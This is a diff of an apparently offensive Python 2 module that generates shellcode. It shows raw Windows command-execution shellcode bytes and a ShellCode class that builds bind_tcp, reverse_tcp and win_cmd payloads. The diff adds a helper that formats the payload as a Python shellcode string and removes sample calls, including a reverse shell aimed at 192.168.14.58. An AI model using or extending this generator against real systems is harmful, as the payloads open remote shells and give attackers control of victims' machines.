@@ -73,6 +73,14 @@ WINCMD_FORMAT += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
 WINCMD_FORMAT += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
 WINCMD_FORMAT += "\xff\xd5%s\x00"
 
+def getPythonCode(code):
+    codes = "shellcode = \""
+    for c in code:
+        cc = hex(ord(c))
+        codes += "\\x0" + cc[2:] if len(cc)<4 else "\\x" + cc[2:]
+    codes += "\""
+    return codes
+
 class ShellCode(object):
     def __init__(self, args={"type":"reverse_tcp", "host":"127.0.0.1", "port":"1234"}):
         self.args = args
@@ -104,12 +112,3 @@ class ShellCode(object):
             return WINCMD_FORMAT % (self.getCmd())
         else:
             return None
-
-s = ShellCode({"type":"bind_tcp","port":8888})
-print s.getShellCode()
-'''
-s = ShellCode({"type":"win_cmd", "cmd":"cmd.exe"})
-print s.getShellCode()
-s = ShellCode({"type":"reverse_tcp", "host":"192.168.14.58", "port":1234})
-print s.getShellCode()
-'''
